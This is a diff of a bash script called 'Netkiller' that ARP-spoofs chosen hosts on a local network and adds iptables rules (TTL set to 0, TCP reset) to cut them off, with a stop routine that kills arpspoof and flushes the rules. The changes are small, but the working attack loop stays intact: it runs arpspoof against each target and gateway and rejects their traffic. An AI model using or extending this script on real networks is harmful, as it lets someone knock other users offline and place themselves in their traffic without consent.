@@ -35,8 +35,7 @@ sleep 2
 echo -e "\nUnblocking network devices..."
 pkill -f arpspoof
 pkill arpspoof
-ip -s -s neigh flush all >/dev/null 2>&1
-iptables -t mangle -F
+iptables -t mangle -F FORWARD 
 iptables -F FORWARD
 sleep 2
 echo -e "\nConnection is restored..."
@@ -227,14 +226,12 @@ fi
 echo " "
 
 # Start ARP spoofing for each target
-PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
      iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
      iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-    PIDS+=($!)
 done
 
 echo -e "\nTo stop Netkiller, run: netkiller-stop"
-arp -e
+
